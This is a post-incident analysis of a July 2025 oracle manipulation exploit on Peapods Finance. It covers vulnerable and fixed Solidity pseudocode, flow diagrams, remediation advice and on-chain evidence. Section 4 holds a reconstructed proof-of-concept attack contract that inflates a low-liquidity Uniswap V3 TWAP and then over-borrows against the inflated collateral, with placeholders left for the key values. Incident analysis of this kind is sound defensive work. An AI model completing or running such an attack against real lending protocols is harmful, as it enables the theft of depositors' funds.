# PeapodsFinance — TWAP Oracle Price Dependency Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-07-08 |
| **Protocol** | Peapods Finance |
| **Chain** | Ethereum (Mainnet) |
| **Loss** | ~78.5 ETH ($229,950 USD) |
| **Attacker** | [0x277d...2a846](https://etherscan.io/address/0x277da2d1ce5601c0f0133515c19da314fc52a846) |
| **Attack Contract** | [0x7212...5a006](https://etherscan.io/address/0x7212de58f97ad6c28623752479acaeb6b15ad006) |
| **Attack Tx (Fund Transfer)** | [0xf0f0...2c9a3](https://etherscan.io/tx/0xf0f090982c624e934f0d255913fb94eab9f04c4c4a97dc59c0bba2f69ba2c9a3) |
| **Vulnerable Contract (Pod Lending)** | [0xd153...7257](https://etherscan.io/address/0xd1538a9d69801e57c937f3c64d8c4f57d2967257) |
| **Root Cause** | Use of a low-liquidity Uniswap V3 pool as a TWAP oracle (Vulnerable Price Dependency) |
| **Attack Blocks** | 22873857 ~ 22874078 |
| **PoC Source** | Not registered in DeFiHackLabs (based on community analysis) |

---

## 1. Vulnerability Overview

Peapods Finance is a fully permissionless leveraged yield protocol where users construct their own "Pods". Each Pod operates an internal lending market based on a Fraxlend fork and uses an oracle designated by the Pod creator to evaluate collateral value.

**Core Vulnerability**: The `pLONGsUSDe` and `PodETH` Pods relied on a **low-liquidity Uniswap V3 pool as their TWAP (Time-Weighted Average Price) oracle**. This oracle pool held over $1M in liquidity at the time of Pod creation, but most liquidity providers subsequently withdrew, leaving it in an **extremely low-liquidity state**. The attacker artificially inflated the oracle price by tens of times using small swaps in this vulnerable pool, then **borrowed or liquidated amounts far exceeding the actual collateral value** under the overvalued collateral assessment, stealing approximately 78.5 ETH.

---

## 2. Vulnerable Code Analysis

### 2.1 TWAP Oracle Price Manipulation Vulnerability (Core)

Peapods Finance Pod lending markets read the price of collateral tokens (such as aspLONGsUSDe) from a Uniswap V3 TWAP oracle. While TWAP is resistant to short-term manipulation, **if pool liquidity is extremely low, even a small amount can distort the price over an extended period**.

```solidity
// ❌ Vulnerable code — Peapods Pod oracle pseudocode (estimated)
contract PodOracle {
    IUniswapV3Pool public immutable pool; // aspLONGsUSDe/WETH pool
    uint32 public constant TWAP_PERIOD = 1800; // 30-minute TWAP

    function getPrice() external view returns (uint256) {
        // ❌ Vulnerability: trusts TWAP without validating liquidity
        // When pool liquidity is low, even small swaps can move the tick significantly
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = TWAP_PERIOD; // 30 minutes ago
        secondsAgos[1] = 0;           // now

        (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
        int24 avgTick = int24(
            (tickCumulatives[1] - tickCumulatives[0]) / int56(int32(TWAP_PERIOD))
        );

        // ❌ No liquidity threshold validation
        // ❌ Does not verify whether the oracle pool has sufficient current liquidity
        return OracleLibrary.getQuoteAtTick(avgTick, 1e18, token, WETH);
    }
}
```

```solidity
// ✅ Fixed code — with liquidity validation added
contract PodOracleFixed {
    IUniswapV3Pool public immutable pool;
    uint32 public constant TWAP_PERIOD = 1800;
    uint128 public constant MIN_LIQUIDITY = 1_000_000e18; // minimum liquidity threshold

    function getPrice() external view returns (uint256) {
        // ✅ Fix: validate pool's current liquidity first
        uint128 liquidity = pool.liquidity();
        require(
            liquidity >= MIN_LIQUIDITY,
            "Oracle: Insufficient pool liquidity — price manipulation risk"
        );

        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = TWAP_PERIOD;
        secondsAgos[1] = 0;

        (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
        int24 avgTick = int24(
            (tickCumulatives[1] - tickCumulatives[0]) / int56(int32(TWAP_PERIOD))
        );

        // ✅ Added: validate price deviation against external oracle such as Chainlink
        uint256 twapPrice = OracleLibrary.getQuoteAtTick(avgTick, 1e18, token, WETH);
        uint256 chainlinkPrice = getChainlinkPrice();
        uint256 deviation = twapPrice > chainlinkPrice
            ? (twapPrice - chainlinkPrice) * 1e4 / chainlinkPrice
            : (chainlinkPrice - twapPrice) * 1e4 / chainlinkPrice;
        require(deviation <= 500, "Oracle: Price deviation of 5% or more vs Chainlink"); // 5% tolerance

        return twapPrice;
    }
}
```

**Problem**: When swaps are repeatedly performed in small amounts over the TWAP period (30 minutes) in a pool with depleted liquidity, tick values accumulate and the TWAP price is calculated as tens of times higher than the actual price. The protocol did not validate whether the current pool liquidity was sufficient, leaving this attack vector unblocked.

### 2.2 Absence of Oracle Safety Validation During Permissionless Pod Creation

```solidity
// ❌ Vulnerable Pod creation code (estimated)
function createPod(
    address collateralToken,
    address oraclePool,  // ❌ Users can specify an arbitrary Uniswap V3 pool address
    uint256 maxLTV
) external {
    // ❌ No validation of oracle pool liquidity or trustworthiness
    pods[collateralToken] = Pod({
        oracle: oraclePool,
        maxLTV: maxLTV
    });
}
```

```solidity
// ✅ Fixed Pod creation code
function createPod(
    address collateralToken,
    address oraclePool,
    uint256 maxLTV
) external {
    // ✅ Validate minimum liquidity of the oracle pool
    IUniswapV3Pool pool = IUniswapV3Pool(oraclePool);
    require(
        pool.liquidity() >= MIN_ORACLE_LIQUIDITY,
        "Pod: Insufficient oracle pool liquidity"
    );

    // ✅ Verify cross-validation capability with Chainlink oracle
    // ✅ Requires operator approval or community governance
    require(
        approvedOracles[oraclePool] || hasGovernanceApproval(oraclePool),
        "Pod: Unapproved oracle"
    );

    pods[collateralToken] = Pod({
        oracle: oraclePool,
        maxLTV: maxLTV
    });
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker confirmed in advance that liquidity had significantly declined in the TWAP oracle pool (aspLONGsUSDe/WETH) used by the `pLONGsUSDe` Pod and `PodETH` Pod
- The pool held over $1M in liquidity at Pod creation time, but by the time of the attack, most LPs had withdrawn, leaving it in an extremely low-liquidity state
- Attack contract `0x7212de58...` deployed (block 22873857)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────┐
│                      Preparation Phase                           │
│  Attack contract deployed (block 22873857)                       │
│  aspLONGsUSDe/WETH Uniswap V3 pool — liquidity depletion confirmed│
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│                   Step 1: TWAP Oracle Manipulation               │
│  Repeated small swaps in low-liquidity aspLONGsUSDe/WETH pool   │
│  Tick accumulation over 30-min TWAP window → artificial price spike│
│  aspLONGsUSDe price: inflated tens of times vs. fair value       │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               Step 2: Borrow Against Inflated Collateral         │
│  Call Pod lending contract (0xd1538...) — function 0x2b7a7aaf   │
│  Deposit aspLONGsUSDe as collateral                              │
│  Oracle price = manipulated high value → collateral over-valued  │
│  Borrow WETH at tens of times the actual collateral value        │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│                  Step 3: Repeat Attack (2nd Attempt)             │
│  Attempt same pattern against PodETH or another vulnerable Pod   │
│  ⚠ 2nd attempt front-run by MEV bot Yoink                       │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│                   Step 4: Fund Withdrawal & Laundering           │
│  Stolen WETH → converted to ETH (78.5175512 ETH)                │
│  → Transferred to address 0x656148F26... (block 22874078)        │
│  → Laundered via ChangeNow / FixedFloat mixers                   │
└─────────────────────────────────────────────────────────────────┘
```

**Attack Flow Summary Diagram**:

```
Attacker EOA (0x277d...)
      │
      │ Contract deployment
      ▼
Attack Contract (0x7212...)
      │
      ├──▶ [Low-liquidity Uniswap V3 Pool]
      │    aspLONGsUSDe/WETH
      │    Repeated small swaps → TWAP tick accumulation
      │    ─────────────────────────────
      │    Price: $1 → $tens (manipulated)
      │
      ├──▶ [Pod Lending Contract] (0xd153...)
      │    Deposit aspLONGsUSDe as collateral
      │    Collateral evaluated at manipulated oracle price
      │    ─────────────────────────────
      │    Actual collateral $1 → System recognizes $tens
      │    → Excessive WETH borrow executed
      │
      └──▶ 78.5 ETH stolen → ChangeNow/FixedFloat
```

### 3.3 Outcome

- **Attacker profit**: 78.5175512 ETH (~$229,950)
- **Protocol loss**: WETH liquidity drained from pLONGsUSDe / PodETH Pods
- **2nd attack**: Front-run by MEV bot Yoink (preventing additional losses)

---

## 4. PoC Code Excerpt (Reconstructed from Community Analysis)

> No official PoC is registered in DeFiHackLabs; the attack logic has been reconstructed based on on-chain data and community analysis.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Peapods Finance oracle manipulation attack — reconstructed PoC
// Actual attack contract: 0x7212de58f97ad6c28623752479acaeb6b15ad006
// Attack block: 22873857 (2025-07-08)

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256, int256);

    function observe(uint32[] calldata secondsAgos)
        external
        view
        returns (int56[] memory tickCumulatives, uint160[] memory);

    function liquidity() external view returns (uint128);
}

interface IPodLending {
    // Function selector: 0x2b7a7aaf (confirmed on-chain)
    function borrowAsset(
        address collateral,
        uint256 collateralAmount,
        uint256 borrowAmount,
        address recipient
    ) external;
}

contract PeapodsOracleAttack {
    // aspLONGsUSDe/WETH Uniswap V3 low-liquidity oracle pool
    IUniswapV3Pool constant ORACLE_POOL =
        IUniswapV3Pool(0x/* actual pool address */);

    // Peapods Pod lending contract
    IPodLending constant POD_LENDING =
        IPodLending(0xd1538a9d69801e57c937f3c64d8c4f57d2967257);

    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant ASP_LONG_SUSDE = 0x/* aspLONGsUSDe address */;

    function attack() external {
        // Step 1: Check oracle pool liquidity
        // Confirmed in advance that liquidity was minimal at the time of attack
        uint128 poolLiquidity = ORACLE_POOL.liquidity();
        require(poolLiquidity < 1000e18, "Too much liquidity — manipulation cost too high");

        // Step 2: TWAP manipulation — repeated small swaps in low-liquidity pool
        // Artificially elevate tick over the 30-minute TWAP window
        for (uint i = 0; i < /* iteration count */; i++) {
            // zeroForOne = true: swap direction token0(aspLONGsUSDe) → token1(WETH)
            // This direction lowers the tick and undervalues aspLONGsUSDe vs WETH
            // Opposite direction (false): WETH → aspLONGsUSDe swap overvalues aspLONGsUSDe
            ORACLE_POOL.swap(
                address(this),
                false, // WETH → aspLONGsUSDe: aspLONGsUSDe price rises
                int256(/* small WETH amount */),
                uint160(/* maximum slippage with no price limit */),
                abi.encode("swap")
            );
        }

        // Step 3: Execute Pod borrow with manipulated TWAP
        // Pod oracle reads 30-minute TWAP → aspLONGsUSDe price = manipulated high value
        // Collateral over-valued → can borrow tens of times more WETH than actual value
        uint256 myCollateral = IERC20(ASP_LONG_SUSDE).balanceOf(address(this));
        uint256 inflatedBorrow = myCollateral * /* manipulated price multiplier */ * 80 / 100;

        POD_LENDING.borrowAsset(
            ASP_LONG_SUSDE,
            myCollateral,
            inflatedBorrow, // borrow amount tens of times the actual collateral value
            address(this)
        );

        // Step 4: Receive stolen WETH — attack complete
        // Transfer 78.5 ETH to attacker address via transaction 0xf0f090...c9a3
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Reliance on low-liquidity Uniswap V3 TWAP oracle | **CRITICAL** | CWE-1038 (Insecure Automated Optimizations) |
| V-02 | No oracle safety validation at Pod creation | **HIGH** | CWE-20 (Improper Input Validation) |
| V-03 | No liquidity depletion detection mechanism | **HIGH** | CWE-703 (Improper Check or Handling of Exceptional Conditions) |
| V-04 | Single oracle source dependency (no cross-validation) | **MEDIUM** | CWE-807 (Reliance on Untrusted Inputs) |

### V-01: Low-Liquidity TWAP Oracle Dependency

- **Description**: The aspLONGsUSDe/WETH Uniswap V3 pool was used as an oracle, but over time LPs withdrew most of their liquidity, leaving it in an extremely low-liquidity state. TWAP is generally resistant to short-term manipulation, but with insufficient pool liquidity, even a small amount can artificially sustain a price for 30 minutes or more.
- **Impact**: Collateral value overvalued by tens of times → undercollateralized borrowing → protocol liquidity drained
- **Attack Conditions**: Oracle pool liquidity < sufficiently low level relative to attack cost; ability to maintain swap position throughout the TWAP window

### V-02: No Oracle Safety Validation at Pod Creation

- **Description**: Peapods is a permissionless protocol where anyone can create a Pod, and Pod creators can designate an arbitrary Uniswap V3 pool as an oracle. The protocol does not validate the oracle pool's liquidity, trustworthiness, or whether cross-validation against Chainlink is possible.
- **Impact**: If funds are deposited into a Pod using a malicious or vulnerable oracle pool, full loss is possible
- **Attack Conditions**: Existence of a Pod using a low-liquidity pool as oracle; presence of liquidity providers in that Pod

### V-03: No Liquidity Depletion Detection Mechanism

- **Description**: Even if the oracle pool had sufficient liquidity at Pod creation time, the oracle becomes vulnerable as liquidity decreases afterward. The protocol has no mechanism to continuously monitor oracle pool liquidity or automatically halt functionality when it falls below a threshold.
- **Impact**: Pods that were safe at deployment can become vulnerable over time
- **Attack Conditions**: Attack becomes immediately possible once oracle pool LPs withdraw funds

### V-04: Single Oracle Source Dependency

- **Description**: Price is determined solely by Uniswap V3 TWAP without cross-validation against external trusted oracles such as Chainlink or Band Protocol
- **Impact**: When TWAP manipulation succeeds, the abnormal price is used as-is due to the absence of cross-validation
- **Attack Conditions**: Single oracle dependency architecture

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// Minimum safety measure applicable immediately: oracle pool liquidity threshold validation
contract PodOracleWithLiquidityCheck {
    uint128 public constant MIN_ORACLE_LIQUIDITY = 100_000e18; // minimum liquidity

    function getPrice() external view returns (uint256) {
        // ✅ Verify oracle pool liquidity meets or exceeds threshold
        uint128 currentLiquidity = pool.liquidity();
        require(
            currentLiquidity >= MIN_ORACLE_LIQUIDITY,
            "Oracle: Insufficient oracle pool liquidity — price manipulation risk"
        );

        // TWAP price query (existing logic)
        // ...
    }
}
```

```solidity
// Circuit Breaker: automatically halt on detection of abnormal price spike
contract PodLendingWithCircuitBreaker {
    mapping(address => uint256) public lastKnownPrice;
    uint256 public constant MAX_PRICE_CHANGE_BPS = 2000; // 20% maximum allowed

    function _validateOraclePrice(address token, uint256 currentPrice) internal {
        uint256 lastPrice = lastKnownPrice[token];
        if (lastPrice > 0) {
            uint256 change = currentPrice > lastPrice
                ? (currentPrice - lastPrice) * 10000 / lastPrice
                : (lastPrice - currentPrice) * 10000 / lastPrice;
            require(
                change <= MAX_PRICE_CHANGE_BPS,
                "Circuit breaker: Price change exceeds 20% — suspected oracle manipulation"
            );
        }
        lastKnownPrice[token] = currentPrice;
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 (Low-liquidity TWAP) | Set oracle pool liquidity threshold with dynamic monitoring; extend TWAP period (30 min → 2 hours) |
| V-02 (No oracle validation) | Require $1M+ oracle pool liquidity at Pod creation; introduce governance-approved oracle whitelist |
| V-03 (Liquidity depletion detection) | Implement on-chain liquidity keeper that pauses Pod when below threshold |
| V-04 (Single oracle) | Cross-validate against Chainlink price; halt trading on >5% deviation between two oracles |

---

## 7. Lessons Learned

1. **TWAP is not a silver bullet**: Uniswap V3 TWAP is resistant to short-term flash loan attacks, but extended manipulation is possible when pool liquidity is low. The reliability of an oracle is directly tied to the liquidity of its underlying pool.

2. **Permissionless design makes oracle safety validation even more critical**: In an architecture where users can designate arbitrary oracles, protocol-level oracle safety validation is mandatory. A "user's responsibility" disclaimer can undermine the trustworthiness of the entire protocol.

3. **Static security checks alone are insufficient**: Oracle pool liquidity changes over time. A configuration that was safe at deployment can become vulnerable without ongoing monitoring. Continuous on-chain state monitoring and automated circuit breakers are necessary.

4. **MEV bots can sometimes act as a shield**: The second attack attempt was front-run by MEV bot Yoink, preventing additional losses. This demonstrates that the MEV ecosystem can sometimes serve as an early interceptor of malicious attacks.

5. **Similar incidents**: Rodeo Finance (ARB, July 2023, TWAP oracle manipulation, $1.5M), UwU Lend (ETH, June 2024, Curve oracle manipulation, $20M), and Zunami Protocol (ETH, August 2023, Curve spot price manipulation, $2.1M) all exploited vulnerabilities in the same category.

---

## 8. On-Chain Verification

### 8.1 Confirmed On-Chain Data

| Field | Value | Source |
|------|-----|------|
| Attack contract deployment block | 22873857 | Etherscan |
| Fund transfer block | 22874078 | Etherscan |
| Attack function selector | `0x2b7a7aaf` (repeated calls) | Etherscan transaction history |
| Stolen ETH | 78.5175512 ETH | Etherscan (Tx 0xf0f090...) |
| Receiving address | 0x656148F26dbb782A5C6868A52EbE64D2f7593beF | Etherscan |
| Subsequent fund movement | ChangeNow, FixedFloat mixers | Community tracking |

### 8.2 Attack Transaction Timeline

| Block | Action | Description |
|------|------|------|
| 22873857 | Attack contract deployed | Bytecode starts with `0x60808060` |
| 22873857~22874078 | Repeated `0x2b7a7aaf` calls | Pod lending contract borrow execution |
| 22874078 | 78.5 ETH transferred externally | Recipient: `0x656148F26...` |

### 8.3 Precondition Analysis

- **Oracle pool liquidity**: At the time of the attack, aspLONGsUSDe/WETH pool liquidity had declined from the initial $1M+ to an extremely low level
- **Victim contract source**: `0xd1538a9d69801e57c937f3c64d8c4f57d2967257` — unverified on Etherscan (bytecode only)
- **2nd attack**: The attacker's second attempt was front-run by MEV bot Yoink and failed

### 8.4 PoC vs. On-Chain Comparison

| Field | Analysis Estimate | On-Chain Confirmed | Match |
|------|-----------|------------|------|
| Attacker address | `0x277da2...` | ✓ Etherscan label confirmed | ✅ |
| Stolen amount | ~78.5 ETH | 78.5175512 ETH | ✅ |
| Attack mechanism | TWAP oracle manipulation | Repeated `0x2b7a7aaf` function calls | ✅ |
| Chain | Ethereum | Etherscan mainnet | ✅ |
| 2nd attack failure | MEV front-run | BlockSec Phalcon confirmed | ✅ |

---

> **Reference Sources**:
> - [The Defiant — Peapods Finance Oracle Incident Report](https://thedefiant.io/news/defi/peapods-finance-token-slips-5-percent-on-reported-oracle-issue)
> - [Quadriga Initiative Case Study](https://quadrigainitiative.com/casestudy/peapodsfinanceasplongsusdepricemanipulationattack.php)
> - [Peapods Finance Official Twitter Statement](https://x.com/PeapodsFinance/status/1943397524074828068)
> - [Attacker Address Etherscan](https://etherscan.io/address/0x277da2d1ce5601c0f0133515c19da314fc52a846)
> - [Fund Transfer Tx Etherscan](https://etherscan.io/tx/0xf0f090982c624e934f0d255913fb94eab9f04c4c4a97dc59c0bba2f69ba2c9a3)